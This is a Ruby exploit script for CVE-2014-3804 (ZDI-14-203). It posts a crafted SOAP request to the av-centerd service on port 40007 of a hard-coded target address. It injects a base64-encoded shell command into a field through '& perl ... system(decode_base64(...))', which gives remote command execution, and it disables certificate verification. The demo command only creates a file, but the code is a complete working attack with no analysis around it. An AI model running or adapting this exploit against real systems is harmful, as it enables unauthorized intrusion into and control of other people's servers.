#! /usr/bin/env ruby

=begin
ZDI-14-203
CVE-2014-3804
=end

require 'base64'
require 'net/http'
require 'net/https'
require 'uri'

target = "192.168.1.240"
command = "touch /tmp/file.txt"

def rand_base(len, bad, *foo)
  cset = (foo.join.unpack("C*") - bad.to_s.unpack("C*")).uniq
  return "" if cset.length == 0
  outp = []
  len.times { outp << cset[rand(cset.length)] }
  outp.pack("C*")
end

def rand_text_alpha(len, bad='')
	foo = []
	foo += ('A' .. 'Z').to_a
	foo += ('a' .. 'z').to_a
	return rand_base(len, bad, *foo)
end

def encode_base64(command)
	return Base64.encode64(command).strip!
end

def soapRequest(target, command)
	perl_payload =  "system(decode_base64"
	perl_payload += "(\"#{encode_base64(command)}\"))"

	soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	soap += "<soap:Envelope xmlns:soap=\"http:\/\/schemas.xmlsoap.org/soap/envelope/\"\r\n"
	soap += "xmlns:soapenc=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding/\" xmlns:xsd=\"http:\/\/www.w3.org\/2001\/XMLSchema\"\r\n"
	soap += "xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\"\r\n"
	soap += "soap:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\">\r\n"
	soap += "<soap:Body>\r\n"
	soap += "<set_file xmlns=\"AV\/CC\/Util\">\r\n"
  	soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
  	soap += "<c-gensym5 xsi:type=\"xsd:string\">423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</c-gensym5>\r\n"
  	soap += "<c-gensym7 xsi:type=\"xsd:string\">#{target}</c-gensym7>\r\n"
  	soap += "<c-gensym9 xsi:type=\"xsd:string\">#{rand_text_alpha(15)}</c-gensym9>\r\n"
  	soap += "<c-gensym11 xsi:type=\"xsd:string\">&amp; perl -MMIME::Base64 -e '#{perl_payload}' </c-gensym11>\r\n"
  	soap += "<c-gensym13 xsi:type=\"xsd:string\">#{rand_text_alpha(32)}</c-gensym13>\r\n"
  	soap += "<c-gensym15 xsi:type=\"xsd:string\">#{rand_text_alpha(15)}</c-gensym15>\r\n"
  	soap += "<c-gensym17 xsi:type=\"xsd:string\">#{rand_text_alpha(15)}</c-gensym17>\r\n"
  	soap += "<c-gensym19 xsi:type=\"xsd:string\">#{rand_text_alpha(15)}</c-gensym19>\r\n"
  	soap += "<c-gensym21 xsi:type=\"xsd:string\">#{rand_text_alpha(3)}</c-gensym21>\r\n"
	soap += "</set_file>\r\n"
	soap += "</soap:Body>\r\n"
	soap += "</soap:Envelope>\r\n"

	return soap
end

def main(target, command)
	uri = URI.parse("https://#{target}")
	http = Net::HTTP.new(uri.host, 40007)
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE
	
	req = Net::HTTP::Post.new("/av-centerd")
	req.initialize_http_header({
		'Content-Type'	=>	'text/xml; charset=UTF-8',
		'SOAPAction'		=>	'"AV/CC/Util#set_file"'
	})
	req.body = soapRequest(target, command)
	
	res = http.request(req)

	puts res.body

end

main(target, command)
